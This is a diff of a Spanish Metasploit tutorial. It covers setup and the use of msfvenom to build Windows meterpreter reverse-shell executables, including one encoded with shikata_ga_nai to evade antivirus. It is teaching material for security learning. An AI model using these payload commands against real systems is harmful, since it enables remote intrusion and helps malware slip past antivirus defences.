@@ -24,7 +24,6 @@ david@camaleon> msfconsole
  ** Welcome to Metasploit Framework Initial Setup **
     Please answer a few questions to get started.
 
-
 Would you like to use and setup a new database (recommended)?
 Please answer yes or no.
 Would you like to use and setup a new database (recommended)? yes
@@ -34,15 +33,6 @@ Creating database users
 Creating initial database schema
 
  ** Metasploit Framework Initial Setup Complete **
-
-
- _                                                    _
-/ \    /\         __                         _   __  /_/ __
-| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
-| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
-|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
-      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
-
 
        =[ metasploit v4.17.34-dev-                        ]
 + -- --=[ 1845 exploits - 1045 auxiliary - 320 post       ]
@@ -102,7 +92,10 @@ Encargado de cifrar exploits, payload, etc.
 
 # 3. TEORÍA: Generando Payloads
 
-Con la herramienta `msfvenom` podemos generar nuestros propios Payloads para un objetivo específico. Además también los podemos exportar a varios formatos ejecutables y cifrarlo con cualquiera de los "encoder".
+Con la herramienta `msfvenom` podemos generar nuestros propios Payloads para un objetivo específico. Además también podemos
+* Exportar la salida a varios formatos ejecutables
+* Cifrarlo con cualquiera de los "encoder".
+* Y el fichero generado es portable e  independiente de Metasploit.
 
 
 ## 3.1 Ejemplo: shell inversa
@@ -118,7 +111,8 @@ Example: /opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows
 msf > msfvenom -p windows/meterpreter/reverse_tcp
                LHOST=127.0.0.1
                LPORT=4444
-               -f exe > shell.exe
+               -f exe
+               > ejemplo1.exe
 ```
 
 | Parámetro | Descripción | Ejemplo |
@@ -127,14 +121,20 @@ msf > msfvenom -p windows/meterpreter/reverse_tcp
 | LHOST     | Nuestra IP local | 127.0.0.1 |
 | LPORT     | Nuestro puerto local | 4444 |
 | -f        | Formato de salida | Ejecutable shell.exe 32bits |
+| -e        | Encoder | N/A |
+| >, -o     | Fichero de salida | ejemplo1.exe |
 
 Cuando se ejecute este Payload tendremos una shell de Meterpreter reversa. Es decir, él se conectaría a nosotros y esta iría por el protocolo TCP.
 
 ## 3.2 Ejemplo: esconderse del antivirus
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp
+         LHOST=127.0.0.1
+         LPORT=4444
+         -f exe
+         -e x86/shikata_ga_nai
+         > ejemplo2.exe
 ```
-
 
 * Este ejemplo es similar al anterior pero nuestro Payload esta cifrado por el encoder "shikata_ga_nai" para protegerse, por ejemplo, de los antivirus.
